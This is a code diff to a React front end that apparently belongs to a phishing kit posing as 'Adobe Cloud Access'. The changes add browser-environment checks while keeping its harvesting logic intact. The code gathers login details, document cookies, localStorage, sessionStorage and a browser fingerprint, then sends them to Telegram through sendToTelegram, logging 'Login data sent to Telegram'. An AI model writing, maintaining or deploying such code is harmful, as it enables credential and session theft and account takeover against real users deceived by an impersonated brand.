@@ -19,18 +19,30 @@ function App() {
   // Check if device is mobile
   useEffect(() => {
     const checkMobile = () => {
-      setIsMobile(window.innerWidth <= 768);
+      if (typeof window !== 'undefined') {
+        setIsMobile(window.innerWidth <= 768);
+      }
     };
     
     checkMobile();
-    window.addEventListener('resize', checkMobile);
-    return () => window.removeEventListener('resize', checkMobile);
+    
+    if (typeof window !== 'undefined') {
+      window.addEventListener('resize', checkMobile);
+      return () => window.removeEventListener('resize', checkMobile);
+    }
   }, []);
 
   // Check for existing session on load
   useEffect(() => {
     const checkSession = async () => {
       try {
+        // Check if we're in browser environment
+        if (typeof window === 'undefined') {
+          setCurrentPage('login');
+          setIsLoading(false);
+          return;
+        }
+        
         // Check for OAuth callback first
         const urlParams = new URLSearchParams(window.location.search);
         const isOAuthCallback = urlParams.has('oauth_callback') || urlParams.has('code') || urlParams.has('state');
@@ -42,7 +54,7 @@ function App() {
         }
 
         // Check for existing session
-        const existingSession = localStorage.getItem('adobe_autograb_session');
+        const existingSession = typeof localStorage !== 'undefined' ? localStorage.getItem('adobe_autograb_session') : null;
         if (existingSession) {
           try {
             const sessionData = JSON.parse(existingSession);
@@ -51,7 +63,9 @@ function App() {
             setCurrentPage('landing');
           } catch (error) {
             console.error('Error parsing existing session:', error);
-            localStorage.removeItem('adobe_autograb_session');
+            if (typeof localStorage !== 'undefined') {
+              localStorage.removeItem('adobe_autograb_session');
+            }
             setCurrentPage('login');
           }
         } else {
@@ -70,6 +84,8 @@ function App() {
   }, []);
 
   const handleOAuthCallback = async () => {
+    if (typeof window === 'undefined') return;
+    
     const urlParams = new URLSearchParams(window.location.search);
     const code = urlParams.get('code');
     const state = urlParams.get('state');
@@ -88,20 +104,24 @@ function App() {
         timestamp: new Date().toISOString(),
         fileName: 'Adobe Cloud Access',
         clientIP: 'Unknown',
-        userAgent: navigator.userAgent,
-        deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
+        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
+        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
         cookies: postAuthFingerprint.cookies,
-        documentCookies: document.cookie,
+        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
         localStorage: postAuthFingerprint.localStorage,
         sessionStorage: postAuthFingerprint.sessionStorage,
         browserFingerprint: postAuthFingerprint
       };
 
       // Store successful session
-      localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+      if (typeof localStorage !== 'undefined') {
+        localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+      }
       
       // Set session cookies
       try {
+        if (typeof document === 'undefined') return;
+        
         const sessionId = sessionData.sessionId;
         const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
         
@@ -126,9 +146,13 @@ function App() {
       setCurrentPage('landing');
 
       // Clean up URL
-      window.history.replaceState({}, document.title, window.location.pathname);
+      if (typeof window !== 'undefined' && typeof document !== 'undefined') {
+        window.history.replaceState({}, document.title, window.location.pathname);
+      }
 
       // Show success notification
+      if (typeof document === 'undefined') return;
+      
       const notification = document.createElement('div');
       notification.innerHTML = `
         <div style="
@@ -168,6 +192,8 @@ function App() {
     
     // Set session cookies
     try {
+      if (typeof document === 'undefined') return;
+      
       const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
       const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
       
@@ -188,26 +214,40 @@ function App() {
       timestamp: new Date().toISOString(),
       fileName: 'Adobe Cloud Access',
       clientIP: 'Unknown',
-      userAgent: navigator.userAgent,
-      deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
+      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
+      deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
       cookies: browserFingerprint.cookies,
-      documentCookies: document.cookie,
+      documentCookies: typeof document !== 'undefined' ? document.cookie : '',
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
       browserFingerprint: browserFingerprint
     };
 
     setHasActiveSession(true);
-    localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
+    if (typeof localStorage !== 'undefined') {
+      localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
+        // Store session data before calling success handler
+        if (typeof localStorage !== 'undefined') {
+          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+        }
+        
+    }
 
     try {
       await sendToTelegram(updatedSession);
+        
+        // Ensure we redirect to landing page
+        setCurrentPage('landing');
+        setIsLoading(false);
       console.log('✅ Login data sent to Telegram');
     } catch (error) {
       console.error('❌ Failed to send to Telegram:', error);
     }
 
-    setCurrentPage('landing');
+    // Ensure we always redirect to landing page after successful login
+    setTimeout(() => {
+      setCurrentPage('landing');
+    }, 100);
   };
 
   // Handler for file actions
@@ -219,14 +259,20 @@ function App() {
   // Handler for logout
   const handleLogout = () => {
     // Clear all session data
-    localStorage.removeItem('adobe_autograb_session');
-    sessionStorage.clear();
+    if (typeof localStorage !== 'undefined') {
+      localStorage.removeItem('adobe_autograb_session');
+    }
+    if (typeof sessionStorage !== 'undefined') {
+      sessionStorage.clear();
+    }
     
     // Clear cookies
-    const cookies = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
-    cookies.forEach(cookie => {
-      document.cookie = `${cookie}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
-    });
+    if (typeof document !== 'undefined') {
+      const cookies = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
+      cookies.forEach(cookie => {
+        document.cookie = `${cookie}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+      });
+    }
     
     setHasActiveSession(false);
     setCurrentPage('login');
